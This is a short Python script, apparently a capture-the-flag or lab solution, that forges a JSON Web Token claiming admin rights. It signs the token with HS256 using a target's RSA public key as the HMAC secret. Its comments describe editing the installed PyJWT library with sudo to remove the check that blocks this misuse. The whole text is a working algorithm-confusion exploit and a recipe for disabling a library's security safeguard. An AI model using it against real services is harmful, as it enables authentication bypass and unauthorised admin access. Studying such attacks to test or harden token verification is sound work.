pub_key = "-----BEGIN RSA PUBLIC KEY-----\nMIIBCgKCAQEAvoOtsfF5Gtkr2Swy0xzuUp5J3w8bJY5oF7TgDrkAhg1sFUEaCMlR\nYltE8jobFTyPo5cciBHD7huZVHLtRqdhkmPD4FSlKaaX2DfzqyiZaPhZZT62w7Hi\ngJlwG7M0xTUljQ6WBiIFW9By3amqYxyR2rOq8Y68ewN000VSFXy7FZjQ/CDA3wSl\nQ4KI40YEHBNeCl6QWXWxBb8AvHo4lkJ5zZyNje+uxq8St1WlZ8/5v55eavshcfD1\n0NSHaYIIilh9yic/xK4t20qvyZKe6Gpdw6vTyefw4+Hhp1gROwOrIa0X0alVepg9\nJddv6V/d/qjDRzpJIop9DSB8qcF1X23pkQIDAQAB\n-----END RSA PUBLIC KEY-----\n"

import jwt
import base64
import json

token = jwt.encode({"admin": True}, pub_key, algorithm="HS256")
print(token)

# Running this code by itself throws the following error:

# File "/usr/lib/python3/dist-packages/jwt/algorithms.py", line 189, in prepare_key
#     raise InvalidKeyError(
# jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.

# Therefore, I run 'sudo nvim /usr/lib/python3/dist-packages/jwt/algorithms.py' and comment the whole if that contains line 189.
# After doing that, I run the code again and this time it throws the malicious token we want.

